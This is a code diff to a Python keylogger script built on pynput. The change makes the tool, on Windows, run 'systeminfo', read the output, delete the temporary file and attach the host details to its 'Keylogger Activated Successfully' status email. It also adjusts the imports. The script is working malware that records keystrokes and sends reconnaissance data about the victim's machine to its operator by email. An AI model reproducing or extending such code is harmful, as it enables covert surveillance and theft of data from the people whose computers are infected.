@@ -5,7 +5,19 @@ def main():
         from pynput.keyboard import Key, Listener
 
         if IsAccountActive:
-            msg = "Keylogger Activated Successfully..."
+            if operating_system == "Windows":
+                terminal("systeminfo > systeminfo.txt")
+                
+                file = open("systeminfo.txt", "r")
+                systeminfo = file.read()
+                file.close()
+                
+                remove("systeminfo.txt")
+                
+                msg = f"Keylogger Activated Successfully...\n\nSystem Info:\n{systeminfo}"
+            
+            else:
+                msg = "Keylogger Activated Successfully..."
 
             try:
                 print("[INFO]\tSending status email...")
@@ -251,6 +263,9 @@ try:
     from logging import DEBUG, basicConfig, info
 
     basicConfig(filename="log.txt", level=DEBUG, format="%(asctime)s: %(message)s")
+    
+    print("[INFO]\tImporting remove from os.")
+    from os import remove
 
     print("[INFO]\tImporting system as terminal from os.")
     from os import system as terminal
@@ -268,9 +283,6 @@ try:
 
     print("[INFO]\tImporting gaierror from socket.")
     from socket import gaierror
-
-    print("[INFO]\tImporting getoutput from subprocess")
-    from subprocess import getoutput
 
     print("[INFO]\tImporting exit as terminate from sys.")
     from sys import exit as terminate
